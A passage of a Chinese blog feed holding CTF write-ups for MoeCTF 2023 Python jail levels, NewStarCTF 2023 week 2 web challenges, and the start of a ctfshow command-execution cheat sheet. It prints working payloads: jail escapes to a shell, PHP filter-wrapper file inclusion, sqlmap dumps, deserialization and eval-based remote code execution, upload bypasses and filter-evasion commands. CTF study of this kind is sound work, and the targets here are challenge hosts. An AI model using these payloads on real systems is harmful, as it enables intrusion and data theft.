1"></a>Jail Level 1</h3><p>限制payload 长度12<br><code> breakpoint()</code><br><img src="/mdimg/moectf2023/54.png"></p><h3 id="Jail-Level-2"><a href="#Jail-Level-2" class="headerlink" title="Jail Level 2"></a>Jail Level 2</h3><p>长度 6  <code>help()</code><br>随便输入一个模块 比如 os 然后 !sh 拿到shell<br><img src="/mdimg/moectf2023/55.png"><br><img src="/mdimg/moectf2023/56.png"></p><h3 id="Jail-Level-3"><a href="#Jail-Level-3" class="headerlink" title="Jail Level 3"></a>Jail Level 3</h3><p><img src="/mdimg/moectf2023/57.png"><br><code>ｂreakpoint()</code>用特殊符号b绕过<br>需要在linux nc</p><h3 id="Jail-Level-4"><a href="#Jail-Level-4" class="headerlink" title="Jail Level 4"></a>Jail Level 4</h3><p>py2 <code> eval(input(&#39;&gt;&gt;&gt;&gt;&gt;&#39;))</code><br><img src="/mdimg/moectf2023/58.png"><br>看看源码<br><img src="/mdimg/moectf2023/59.png"></p><h3 id="Leak-Level-0"><a href="#Leak-Level-0" class="headerlink" title="Leak Level 0"></a>Leak Level 0</h3><p><img src="/mdimg/moectf2023/60.png"><br>拿key进后门<br><code> globals()</code><br><img src="/mdimg/moectf2023/61.png"></p><h3 id="Leak-Level-1"><a href="#Leak-Level-1" class="headerlink" title="Leak Level 1"></a>Leak Level 1</h3><p><img src="/mdimg/moectf2023/62.png"><br>长度6<br><code>vars()</code><br><img src="/mdimg/moectf2023/63.png"></p><h3 id="Leak-Level-2"><a href="#Leak-Level-2" class="headerlink" title="Leak Level 2"></a>Leak Level 2</h3><p>help() –》 <code>__mian__</code>拿到key<br><img src="/mdimg/moectf2023/64.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023 week2 wp</title>
    <link href="/2023/10/16/NewStarCTF%202023%20week2/"/>
    <url>/2023/10/16/NewStarCTF%202023%20week2/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p>查看js源码可以看到以下片段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php">游戏高手<span class="hljs-comment">//游戏结束</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gameover</span>(<span class="hljs-params"></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(gameScore &gt; <span class="hljs-number">100000</span>)&#123;   <br>    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>    xhr.<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;/api.php&quot;</span>, <span class="hljs-literal">true</span>);        <span class="hljs-comment">//向/api.php post发包</span><br>    xhr.<span class="hljs-title function_ invoke__">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);  <span class="hljs-comment">//设置header</span><br>    xhr.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-keyword">if</span> (xhr.readyState === <span class="hljs-number">4</span> &amp;&amp; xhr.status === <span class="hljs-number">200</span>) &#123;<br>        <span class="hljs-keyword">var</span> response = JSON.<span class="hljs-title function_ invoke__">parse</span>(xhr.responseText);<br>        <span class="hljs-title function_ invoke__">alert</span>(response.message);<br>      &#125;<br>    &#125;;<br>    <span class="hljs-keyword">var</span> data = &#123;<br>      score: gameScore,          <br>      &#125;;<br>    xhr.<span class="hljs-title function_ invoke__">send</span>(JSON.<span class="hljs-title function_ invoke__">stringify</span>(data));  <span class="hljs-comment">//json格式发送score</span><br>  &#125;<br>  <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;成绩：&quot;</span>+gameScore);<br>  gameScore=<span class="hljs-number">0</span>;  <br>  curPhase =PHASE_READY;  <br>  hero = <span class="hljs-literal">null</span>;<br>  hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();      <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/newstarweek2/1.png"><br><img src="/mdimg/newstarweek2/2.png"></p><h2 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>显然是ban了filter协议的base和rot编码<br>然鹅filter不只支持base和rot编码<br><a href="https://blog.csdn.net/gental_z/article/details/122303393">https://blog.csdn.net/gental_z/article/details/122303393</a><br><code>?file=php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php</code></p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p><code>sqlmap -r 1.txt --batch -D ctf -T here_is_flag -C flag --dump</code><br>1.txt 是 抓包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">GET /?id=TMP1589 HTTP/<span class="hljs-number">1.1</span><br>Host: e0f82dae-d70f-<span class="hljs-number">441</span>e-bb37-aec6423da5b0.node4.buuoj.cn:<span class="hljs-number">81</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">101.0</span>.<span class="hljs-number">4951.41</span> Safari/<span class="hljs-number">537.36</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><h2 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h2><p>反序列化 <code>private </code>变量序列化之后产生不可见字符 用<code>%00</code>替换<br><img src="/mdimg/newstarweek2/3.png"><br><code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:33:&quot;nl /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code><br><img src="/mdimg/newstarweek2/4.png"><br>也可以用</p><ul><li>od  -c：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:36:&quot;od /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></li><li>uniq ：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:35:&quot;uniq /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></li><li>head：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:35:&quot;head /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></li><li>sort：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:35:&quot;sort /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></li><li>file -f ：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:38:&quot;file -f /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></li></ul><h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p><code>.htaccess</code><br><img src="/mdimg/newstarweek2/5.png"><br><code>script</code>标签绕过<br><img src="/mdimg/newstarweek2/6.png"><br><img src="/mdimg/newstarweek2/7.png"></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p><code>dirsearch扫</code><br>buu 特性 要设置延时<br><code>dirsearch -u [http://2720598a-9ade-4894-aa95-bed7e562413c.node4.buuoj.cn:81/](http://2720598a-9ade-4894-aa95-bed7e562413c.node4.buuoj.cn:81/) --delay=5  </code><br><img src="/mdimg/newstarweek2/8.png"><br>GitHack<br><code>python2 GitHack.py -u [http://2720598a-9ade-4894-aa95-bed7e562413c.node4.buuoj.cn:81/.git/](http://2720598a-9ade-4894-aa95-bed7e562413c.node4.buuoj.cn:81/.git/) </code><br>bo0g1pop.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>[^\W]+\((?R)?\)</code><br><code>[^\W]</code>匹配所有字符<br><code>(?R)</code>表示递归<br>这个正则匹配类似<code>abc()</code>的字符 而<code>preg_replace</code>把匹配到的类似的字符置空<br><img src="/mdimg/newstarweek2/9.png"><br><img src="/mdimg/newstarweek2/10.png"><br><img src="/mdimg/newstarweek2/11.png"><br>可以看出 大概逻辑就是括号里面不能有字符，如果有则必须是<code>xxx()</code>格式的<br><code>get_defined_vars scandir</code>ban了好多payload<br>思路就是找到一个可以传参数的地方然后再套一个eval来绕过<br><code>get_defined_vars()</code>返回是一个包含 GET、POST等的数组 这里被ban了，搜一下有没有类似函数<br>有两个<code>get_defined_functions()</code>和<code>get_defined_constants()</code> 分别返回已定义方法 、 常量<br><code>get_defined_functions()</code>里面有很多方法包括<code>scandir</code>和<code>get_defined_vars()</code><br>但是数组太大，不知道怎么选中其中一个键<br>后面想到，能传参数的不只有GET POST 还有 header<br>翻php文档发现<code>get_headers</code>可以取得服务器响应 HTTP 请求所发送的所有标头<br>但是这个函数需要一个参数<br>然后找到了<code>headers_list</code><br><img src="/mdimg/newstarweek2/12.png"><br>语法错误…<br>再找找<br><code>apache_response_headers</code> 还是 只有content-type ………<br>然后找到了<code>getallheaders()</code><br><img src="/mdimg/newstarweek2/13.png"><br>可以用ua头<br><img src="/mdimg/newstarweek2/14.png"><br>或者xff和<code>X-Forwarded-Proto</code> </p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-命令执行web29-web77 wp</title>
    <link href="/2023/10/07/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb29-web77/"/>
    <url>/2023/10/07/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb29-web77/</url>
    
    <content type="html"><![CDATA[<h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p>我要成为bypass高手！</p><h4 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h4><ul><li>** 正则界定符**</li></ul><p>正则表达式使用界定符包围正则字符串作为正则表达式的代码<br>常见界定符”/“,”#”,”~”或者括号对 () [] {}<br>代码解释:与php的<?php ,?>的开始结束标签相同</p><p><code>/foo bar/   </code>      ; “/“界定符<br><code>#^[^0-9]$#  </code>      ; “#”界定符<br><code>+test+</code>            ; “+”界定符<br><code>%[a-zA-Z0-9_-]%</code>   ; “%”界定符<br>正则字符串中出现界定符时，需要使用反斜线”/“转义处理，</p><p><code>/http:\/\// </code>    ;”/“作为界定符，匹配http://时，”/“需要转义<br><code>#http://# </code>      ;”#”作为界定符，匹配http://时，”/“不需要转义<br>可以在结束分隔符后面增加模式修饰符</p><ul><li><strong>2-1 常量字符串</strong></li></ul><p>匹配常量字符串hello<br><code>&quot;/hello/&quot;</code><br>匹配忽略大小写常量字符串 hello<br><code>&quot;/hello/i&quot;</code></p><ul><li><strong>2-2-1简单变量字符: 使用 带有转义的单个特殊字符表示</strong></li></ul><p>\d    ;匹配一个数字字符                    等价于[0-9]<br>\D    ;匹配一个非数字字符                  等价于[^0-9]<br>\s    ;匹配一个任意空白字符                等价于[\n\r\t\v\f]<br>\S    ;匹配一个任意非空白字符              等价于[^\n\r\t\v\f]<br>\w    ;匹配一个字母/数字/下划线/汉字字符    等价于[A-Za-z0-9_]<br>\W    ;匹配一个任意非单词字符              等价于[^A-Za-z0-9_]<br>.     ;匹配一个 除换行\n外的任意字符        等价于[^\n]<br>\n    ;匹配一个换行符  等价于\x0a和\cL<br>\r    ;匹配一个回车符  等价于\x0d和\cM<br>\t    ;匹配一个水平制表符 等价于\x09和\cI<br>\v    ;匹配一个垂直制表符 等价于\x0b和\cK<br>\f    ;匹配一个换页符  等价于\x0c和\cL<br>另外，如果要查找字符 *、.、/等，则需要在前面用 \ 符号，表示这不是元字符，而只是普通字符而已。<br>*    匹配 * 字符。<br>.    匹配 . 字符。<br>/    匹配 / 字符。<br>\    匹配 \ 字符。<br>[    匹配 [ 字符。</p><ul><li>元字符 </li></ul><p>$    匹配行尾<br>^    匹配行首<br>&lt;    匹配单词词首<br>&gt;    匹配单词词尾</p><p>“/\d/“    匹配数字字符<br>“/\s/“     空白字符<br>“/\w/“    单词字符</p><ul><li><strong>2-2-2字符类变量字符: 使用 []格式表示</strong></li></ul><p>[xyz]  ;匹配xyz其中一个字符<br>[a-z]  ;匹配a到z其中一个字符<br>[A-Z]  ;匹配A到Z其中一个字符<br>[0-9]  ;匹配0到9其中一个字符<br>[^xyz] ;匹配除xyz以外的一个字符<br>[^a-z] ;匹配除a到z外的一个字符<br>[:punct:] ;匹配任意标点符号(#&amp;+   web中这3个好像不行)</p><ul><li><strong>3 正则表达式逻辑控制</strong></li></ul><p>1 匹配位置内容判断<br>^x(exp)     ;判断字符串第一个字符是否为x    if (str.first_letter == x) {匹配}<br>(exp)x$     ;判断字符串最后一个字符是否为x  if (str.last_letter == x) {匹配}<br>\bx(exp)    ;判断单词第一个字符是否是x      if (word.first_letter == x){匹配}<br>(exp)y\b    ;判断单词最后一个字符是否是x    if (word.last_letter == x){匹配}<br>(?&lt;=exp)x     ;匹配前面是exp的x         (if x.prev == exp){匹配x}<br>(?&lt;!exp)x     ;匹配前面不是exp的x       (if x.prev != exp){匹配x}<br>x(?=exp)      ;匹配后面是exp的x         (if x.next == exp){匹配x}<br>x(?!exp)      ;匹配后面不是exp的x       (if x.next != exp){匹配x}</p><ul><li>多个判断组合</li></ul><p>或判断 (?&lt;=bullock|donkey)x  匹配前面是bullock或者donkey的x<br>且判断 (?&lt;=\d{3})(?&lt;!999)foo 匹配前面是3个数字而且不是999的foo<br>嵌套判断 (?&lt;=(?&lt;!foo)bar)baz   嵌套判断匹配前面有 ”bar” 但是 ”bar” 前面没有 ”foo” 的 ”baz”。<br>嵌套判断 (?&lt;=\d{3}…(?&lt;!999))foo 匹配前面有三个数字字符紧跟 3 个不是 999 的任意字符的 ”foo”。</p><ul><li>2 匹配内容次数控制</li></ul><p>贪婪匹配:尽可能多匹配<br>x*      ;匹配零或多次个x字符       for(i=0;i&gt;=0;i++){匹配x<em>i}<br>x+      ;匹配一次或多次个x字符     for(i=0;i&gt;0;i++){匹配x</em>i}<br>x?      ;匹配零次或一次个x字符     for(i=0;0&lt;=i&lt;=1;i++){匹配x<em>i}<br>x{n}    ;匹配n次个x字符            for(i=0;i==n;i++){匹配x*i}<br>x{n,}   ;匹配n次或更多次个x字符    for(i=0;i&gt;=n;i++){匹配x</em>i}<br>x{n,m}  ;匹配n到m次个x字符         for(i=0;n&lt;=x&lt;=m;i++){匹配x*i}</p><ul><li>懒惰匹配：尽可能少匹配</li></ul><p>x*?      ;匹配零或多次个x字符       for(i=0;i&gt;=0;i++){匹配x<em>i}<br>x+?      ;匹配一次或多次个x字符     for(i=0;i&gt;0;i++){匹配x</em>i}<br>x??      ;匹配零次或一次个x字符     for(i=0;0&lt;=i&lt;=1;i++){匹配x<em>i}<br>x{n}?    ;匹配n次个x字符            for(i=0;i==n;i++){匹配x*i}<br>x{n,}?   ;匹配n次或更多次个x字符    for(i=0;i&gt;=n;i++){匹配x</em>i}<br>x{n,m}?  ;匹配n到m次个x字符         for(i=0;n&lt;=x&lt;=m;i++){匹配x*i}</p><ul><li>3-1:普通分组</li></ul><p>(exp)       ;匹配exp变量，并存储到结果分组中<br>(\d)         ;匹配数字分组，并进行存储<br>((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)<br>;匹配多个分组，并进行存储</p><ul><li>3-2: 命名分组</li></ul><p>(?<name>exp)    ;匹配exp变量，并存储到名称为name的结果分组中</p><ul><li>3-3: 一次性分组</li></ul><p>(?&gt;exp)         ;尽可能长匹配exp变量，不对其内部进行匹配</p><ul><li>3-4:条件分组</li></ul><p>(?(conditon)yes-pattern|no-pattern)<br>condition为数字，该数字代表的(之前的)子组得到匹配，使用yes_pattern,否则使用no-pattern<br>condition为断言，断言成功使用yes-pattern,断言失败使用no-pattern</p><ul><li>4 正则模式修正</li></ul><p>\i   ;忽略大小写<br>\m   ;多行模式<br>\s   ;单行模式</p><h4 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>()<br><span class="hljs-title function_ invoke__">passthru</span>()<br><span class="hljs-title function_ invoke__">exec</span>()                             <span class="hljs-comment">//无回显</span><br><span class="hljs-title function_ invoke__">shell_exec</span>()                 <span class="hljs-comment">//无回显</span><br><span class="hljs-title function_ invoke__">popen</span>()                      <span class="hljs-comment">//ssti常见</span><br><span class="hljs-title function_ invoke__">proc_open</span>()<br><span class="hljs-title function_ invoke__">pcntl_exec</span>()            <span class="hljs-comment">// 使用条件：PHP安装并启用了pcntl插件</span><br></code></pre></td></tr></table></figure><h4 id="看目录"><a href="#看目录" class="headerlink" title="看目录"></a>看目录</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">var_dump(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<br>print_r(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<br>print_r(glob(<span class="hljs-string">&quot;*&quot;</span>));                       <span class="hljs-regexp">//</span> 读取当前目录<br>print_r(scandir(pos(localeconv())));     <span class="hljs-regexp">//</span>读取当前目录  <span class="hljs-regexp">//</span>print_r(scandir(<span class="hljs-string">&#x27;.&#x27;</span>));<br>getcwd() == pwd                              <span class="hljs-regexp">//</span> 读取当前目录<br>echo(implode(<span class="hljs-string">&#x27;  &#x27;</span>,scandir(<span class="hljs-string">&#x27;/&#x27;</span>)));        <span class="hljs-regexp">//im</span>plode把数组元素组合为字符串<br>print(implode(<span class="hljs-string">&#x27;  &#x27;</span>,scandir(<span class="hljs-string">&#x27;/&#x27;</span>)));      <span class="hljs-regexp">//im</span>plode把数组元素组合为字符串<br>var_export(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));             <span class="hljs-regexp">//</span>var_export 类似 var_dump<br><br><br></code></pre></td></tr></table></figure><h4 id="读取flag"><a href="#读取flag" class="headerlink" title="读取flag"></a>读取flag</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">more:</span>一页一页的显示档案内容<br><span class="hljs-symbol">less:</span>与 more 类似<br><span class="hljs-symbol">head:</span>查看头几行<br><span class="hljs-symbol">tac:</span>从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br><span class="hljs-symbol">tail:</span>查看尾几行<br>nl：显示的时候，顺便输出行号<br><span class="hljs-symbol">od:</span>以二进制的方式读取档案内容<br><span class="hljs-symbol">vi:</span>一种编辑器，这个也可以查看<br><span class="hljs-symbol">vim:</span>一种编辑器，这个也可以查看<br><span class="hljs-symbol">sort:</span>可以查看<br><span class="hljs-symbol">uniq:</span>可以查看<br>file -f:报错出具体内容<br>sh /flag <span class="hljs-number">2</span>&gt;%<span class="hljs-number">261</span> <span class="hljs-comment">//报错出文件内容    </span><br></code></pre></td></tr></table></figure><h5 id="od："><a href="#od：" class="headerlink" title="od："></a>od：</h5><ul><li>od 命令用于将指定文件内容以八进制、十进制、十六进制、浮点格式或 ASCII 编码字符方式显示，通常用于显示或查看文件中不能直接显示在终端的字符。</li><li>od 命令系统默认的显示方式是八进制</li></ul><p><img src="/mdimg/ctfshow77/1.png"><br>常用 -tc  -a </p><h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);        <span class="hljs-regexp">//</span>(PHP <span class="hljs-number">4</span>, PHP <span class="hljs-number">5</span>, PHP <span class="hljs-number">7</span>, PHP <span class="hljs-number">8</span>)<br>require(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>readfile(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>include(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br>include<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]?&gt;&amp;<span class="hljs-number">1</span>=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br>show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(pos(localeconv())))));  <br>echo highlight_file(<span class="hljs-keyword">next</span>(array_reverse(scandir(pos(localeconv()))))); <br>?c=<span class="hljs-regexp">/bin/</span>?at<span class="hljs-variable">$&#123;IFS&#125;</span>f???????           <span class="hljs-regexp">//</span>通配符匹配 <span class="hljs-regexp">/bin/</span>cat <br>?c=uniq<span class="hljs-variable">$&#123;IFS&#125;</span>f???.php               <span class="hljs-regexp">//u</span>niq 可检查文本文件中重复出现的行列，删除重复行并输出<br>?c= mv<span class="hljs-variable">$&#123;IFS&#125;</span>fla?.php<span class="hljs-variable">$&#123;IFS&#125;</span>a.txt      <span class="hljs-regexp">//</span> ?c=uniq<span class="hljs-variable">$&#123;IFS&#125;</span>a.txt<br>show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(getcwd()))));  <span class="hljs-regexp">//g</span>etcwd()==pwd<br>eval(<span class="hljs-keyword">next</span>(reset(get_defined_vars())));&amp;cmd=;system(<span class="hljs-string">&quot;tac flag.php&quot;</span>);<br>eval(array_pop(<span class="hljs-keyword">next</span>(get_defined_vars()))); <br>?c=<span class="hljs-regexp">/???/</span>????<span class="hljs-number">64</span> ????.???                     <span class="hljs-regexp">//</span>匹配 ?c=<span class="hljs-regexp">/bin/</span>base64 flag.php <br>getallheaders()  <span class="hljs-regexp">//</span>返回http header数组  然后在相应字段注入马 apache_response_headers() 类似<br></code></pre></td></tr></table></figure><h3 id="写在题前"><a href="#写在题前" class="headerlink" title="写在题前"></a>写在题前</h3><ul><li>web55-web56有临时文件包含，条件竞争</li><li>web 57 <code>$(())</code>构造数字</li><li>web72 <code>glob</code>协议绕<code>open_basedir</code>  <code>uaf读文件</code></li><li>web75 <code>PDO</code> 连数据库</li><li>web77 php 7.4 <code>FFI</code><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"> &lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-09-04 00:26:48</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br>*/<br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(isset($_GET[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    $c = $_GET[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, $c))&#123;<br>        <span class="hljs-built_in">eval</span>($c);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(__FILE__);<br>&#125; <br></code></pre></td></tr></table></figure>过滤了flag，大小写不敏感，不能大小写绕过<br>payload：<br><code>?c=system(&#39;tac f*&#39;);</code> 通配符，cat、nl，vi，more，less，od：<code>?c=passthru(&#39;od -a f*&#39;);</code>，<br><code>?c=system(&quot;nl f&#39;&#39;lag.php&quot;);</code>单引号绕过，cat、tac，vi，都行<br><code>?c=echo </code>nl fl’’ag.php<code>;</code> 单引号绕过，反引号命令执行，cat、tac都行<br>套马：<br><code>?c=eval($_GET[1]);&amp;1=system(&quot;cat 